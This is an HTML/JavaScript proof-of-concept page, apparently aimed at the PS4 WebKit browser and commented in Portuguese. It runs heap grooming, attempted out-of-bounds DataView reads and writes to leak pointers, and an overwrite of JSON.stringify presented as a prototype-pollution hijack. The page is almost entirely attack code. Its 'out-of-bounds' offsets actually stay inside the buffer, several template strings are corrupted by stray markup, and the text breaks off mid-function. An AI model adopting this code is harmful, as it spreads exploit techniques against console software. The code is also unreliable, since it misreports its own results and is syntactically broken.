<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - PoC Final v10 (Combinado)</title>
    <style>
        /* Estilos CSS */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-leak { color: #FF9800; font-weight: bold; }
        .log-ptr { color: #f0f; font-weight: bold; }
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        #grooming-area { display: none; }
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - PoC Final v10 (Combinado)</h1>
    <p>Testa: XSS -> Info Leak Attempt -> PP Hijack -> Acesso ao Leak.</p>
    <button id="runBtn" onclick="runExploitChain()">Iniciar PoC Combinada</button>
    <div id="output"></div>
    <div id="grooming-area"></div>

    <script>
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const groomArea = document.getElementById('grooming-area');
        const SHORT_PAUSE = 50;
        const MEDIUM_PAUSE = 200;
        // Variável global para armazenar o primeiro ponteiro potencial vazado
        let leakedPointerInfo = null;

        // --- Função de Log ---
        const log = (message, type = 'info') => { /* ... Função log ... */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-<span class="math-inline">\{type\}"\></span>{t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};

        // --- Heurística de Ponteiro ---
        const isPotentialPointer64 = (high, low) => { /* ... Heurística igual v10 ... */ if(high===null||low===null||typeof high!=='number'||typeof low!=='number')return false;if(high===0&&low===0)return false;if(high===0xFFFFFFFF&&low===0xFFFFFFFF)return false;if(high===0xAAAAAAAA&&low===0xAAAAAAAA)return false;if(high===0xBBBBBBBB&&low===0xBBBBBBBB)return false;if(high===0&&low<0x100000)return false;return true; };
        const toHex = (val, bits = 32) => { /* ... Função toHex ... */ if(typeof val!=='number'||!isFinite(val))return'NaN/Invalid';let n=Number(val);if(bits<=32){n=n>>>0;}const p=Math.ceil(bits/4);return'0x'+n.toString(16).toUpperCase().padStart(p,'0');};

        // --- Teste 1 (Check XSS) ---
        const runCSP_XSS_Check = () => { log("--- T1: Verificação de Entrada XSS ---",'test');log("Execução JS via XSS/CSP OK.",'good');log("--- T1 Concluído ---",'test'); };

        // --- Teste 2: Info Leak Attempt (Grooming + OOB Read + Store Leak) ---
        const runLeakExploitAttempt_Store = async () => {
            log("--- T2: Info Leak Attempt v10 (Store Leak) ---", 'test');
            log("Objetivo: Tentar vazar ponteiro real via Grooming+OOB Read e armazená-lo.", 'warn');
            log("ALTO RISCO DE CRASH!", 'warn');

            leakedPointerInfo = null; // Resetar leak anterior
            const bufferSizeForLeakTest = 32;
            const oobWriteOffset = 32;
            const writeValue = 0xEE;
            const oobReadOffsets = [-32, -24, -16, -8, 40, 48, 56, 64];
            const groomTargetCount = 500;
            const groomDivs = [];
            let potentialLeakFound = false;

            try {
                // 1. HEAP GROOMING
                log(`[T2 Grooming] Alocando ${groomTargetCount} DIVs...`, 'info');
                if (!groomArea) throw new Error("groomArea não encontrada!");
                groomArea.innerHTML = '';
                for(let i = 0; i < groomTargetCount; i++) { /* ... alocação DIVs igual v10 ... */ try{const d=document.createElement('div');d.id=`g${i}`;d.textContent=`G${i}`+'X'.repeat(100+(i%50));d.style.border='1px solid #333';groomArea.appendChild(d);groomDivs.push(d);}catch(e){log(`Err DIV <span class="math-inline">\{i\}\:</span>{e.message}`,'error');}}
                log(`[T2 Grooming] ${groomDivs.length} DIVs add. Pausa...`, 'info');
                await new Promise(r => setTimeout(r, MEDIUM_PAUSE));

                // 2. Alocar Buffer Ataque
                const readBufferSize = 256; const baseOffsetInDataView = 128;
                log(`[T2 Aloc] Alocando buffer R/W (${readBufferSize}B)...`, 'info');
                const buffer = new ArrayBuffer(readBufferSize); const dataView = new DataView(buffer);
                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xBB); }
                log(`[T2 Aloc] Buffer preenchido com 0xBB.`, 'info');

                // 3. OOB Write
                const writeTargetAddress = baseOffsetInDataView + oobWriteOffset;
                log(`[T2 OOB Write] Escrevendo U8 @${oobWriteOffset} (addr ${writeTargetAddress}) = ${toHex(writeValue, 8)}...`, 'subtest');
                try { dataView.setUint8(writeTargetAddress, writeValue); log(`[T2 OOB Write] VULN: OK!`, 'vuln'); }
                catch (e) { log(`[T2 OOB Write] BLOQUEADO: ${e.message}`, 'error'); throw new Error("OOB Write falhou, abortando T2"); }
                await new Promise(r => setTimeout(r, SHORT_PAUSE));

                 // 4. OOB Read Focada e Armazenamento
                 log(`[T2 OOB Read] Lendo U64 nos offsets ${oobReadOffsets.join(', ')}...`, 'subtest');
                 for (const readOffset of oobReadOffsets) {
                     const readTargetAddress = baseOffsetInDataView + readOffset;
                     if (readTargetAddress < 0 || readTargetAddress + 8 > buffer.byteLength) continue;
                     try {
                         const low = dataView.getUint32(readTargetAddress, true);
                         const high = dataView.getUint32(readTargetAddress + 4, true);
                         const maybeAAAA = (high === 0xAAAAAAAA && low === 0xAAAAAAAA);
                         const maybeBBBB = (high === 0xBBBBBBBB && low === 0xBBBBBBBB);

                         if ((low !== 0 || high !== 0) && !maybeAAAA && !maybeBBBB) {
                            if (isPotentialPointer64(high, low)) {
                                 const valueStr = `H=<span class="math-inline">\{toHex\(high\)\} L\=</span>{toHex(low)}`;
                                 log(`  >> POTENCIAL PONTEIRO! @${readOffset}: ${valueStr}`, 'ptr');
                                 potentialLeakFound = true;
                                 if (leakedPointerInfo === null) { // Armazenar APENAS o primeiro ponteiro encontrado
                                     leakedPointerInfo = { high, low, offset: readOffset, type: 'U64Ptr' };
                                     log(`    --> VALOR ARMAZENADO (offset ${readOffset})`, 'vuln');
                                 }
                             } else {
                                 log(`  >> Dado OOB Não Padrão @<span class="math-inline">\{readOffset\}\: H\=</span>{toHex(high)} L=${toHex(low)}`, 'leak');
                                 if (leakedPointerInfo === null) { // Armazenar dado não padrão se ainda não achou ponteiro
                                      leakedPointerInfo = { high, low, offset: readOffset, type: 'U64Data' };
                                      log(`    --> VALOR ARMAZENADO (offset ${readOffset})`, 'vuln');
                                 }
                             }
                         }
                     } catch (e) { /* Ignora erros de leitura */ }
                 } // Fim loop leitura
            } catch (e) { log(`Erro inesperado Teste 2: ${e.message}`, 'error'); }
            finally { /* Limpeza Grooming */ log("[T2 Limpeza] Removendo DIVs...", 'info'); try { groomArea.innerHTML = ''; } catch(e){} groomDivs.length = 0; }

            if (potentialLeakFound) { log(`--- T2 Concluído (POTENCIAIS PONTEIROS ENCONTRADOS! Valor armazenado: ${leakedPointerInfo ? 'SIM' : 'NÃO'}) ---`, 'test');}
            else if (leakedPointerInfo) { log(`--- T2 Concluído (Dados OOB não-padrão encontrados e armazenados) ---`, 'test'); }
            else { log(`--- T2 Concluído (FALHA: Nenhum leak promissor encontrado/armazenado) ---`, 'test'); }
        };

        // --- Teste 3: PP Hijack + Interação com Leak ---
        const runPPHijackAndInteract_v10 = async () => {
            log("--- T3: PP Hijack (JSON.stringify) + Interação com Leak ---", 'test');
            // Usar JSON.stringify como alvo, pois funcionou bem no hijack antes
            const target = { proto: JSON, key: 'stringify', info: "JSON.stringify", action: () => JSON.stringify({a:1}) };
            const originalFunction = target.proto[target.key];
            let hijackSuccessful = false;
            let interactionAttempted = false;
            let leakAccessed = false;

            if (typeof originalFunction !== 'function') {
                 log(`ERRO: Função original ${target.key} não encontrada/não é função. Abortando T3.`, 'error');
                 log("--- T3 Concluído (FALHA SETUP) ---", 'test');
                 return;
            }

            try {
                const spyFunction = function hijackedStringify(value) {
                    hijackSuccessful = true;
                    log(`>> HIJACK T3: DENTRO DA FUNÇÃO ${target.key} SEQUESTRADA! <<`, "vuln");
                    interactionAttempted = true;
                    try {
                        const leak = leakedPointerInfo; // Tenta acessar o leak do Teste 2
                        let leakStr = "NENHUM (Teste 2 falhou ou não encontrou)";
                        if (leak) {
                            leakStr = `<span class="math-inline">\{leak\.type\} @</span>{leak.offset}: H=<span class="math-inline">\{toHex\(leak\.high\)\} L\=</span>{toHex(leak.low)}`;
                            leakAccessed = true; // Marcar que conseguimos ler algo (mesmo que null do reset)
                        }
                        log(`>> HIJACK T3: Valor armazenado pelo Teste 2 (Leak Attempt): ${leakStr}`, 'leak');
                    } catch(interactionError) {
                         log(`>> HIJACK T3: Erro ao acessar/logar valor vazado: ${interactionError.message}`, 'error');
                    }
                    // Retornar algo para indicar sucesso do hijack + acesso ao leak
                    return `{"HIJACKED": true, "LEAK_ACCESSED": <span class="math-inline">\{leakAccessed\}, "LEAK\_VAL"\: "</span>{leakedPointerInfo ? 'FOUND' : 'NONE'}"}`;
                };

                // Poluir
                log(`  Poluindo <span class="math-inline">\{target\.proto\.constructor\.name\}\.</span>{target.key}...`, 'info');
                target.proto[target.key] = spyFunction;

                if (target.proto[target.key] === spyFunction) {
                    log("  Poluição OK. Executando ação de gatilho...", 'info');
                    try {
                        let result = target.action(); // Chamar ação (ex: JSON.stringify({a:1}))
                        log(`  Ação executada. Resultado: ${result}`, 'info');
                        if(hijackSuccessful && result && result.includes('"HIJACKED": true')) {
                            log(`  CONFIRMADO: Hijack e retorno OK para '${target.key}'. Interação com leak ${leakAccessed ? 'bem-sucedida' : 'não realizada (leak foi null?)'}.`, 'vuln');
                        } else if (hijackSuccessful){
                             log(`  AVISO: Hijack ocorreu para '${target.key}', mas retorno inválido.`, 'warn');
                        } else {
                             log(`  AVISO: Ação executada, mas hijack NÃO detectado para '${target.key}'.`, 'warn');
                        }
                    } catch (e) { log(`  ERRO ao executar ação para '${target.key}': ${e.message}`, 'error'); }
                } else { log("  Falha ao poluir/verificar poluição.", 'error'); }

            } catch (e) { log(`  Erro GERAL no teste de hijack para '${target.key}': ${e.message}`, 'error'); }
            finally {
                 // Restaurar
                 if (target.proto && target.key && originalFunction) {
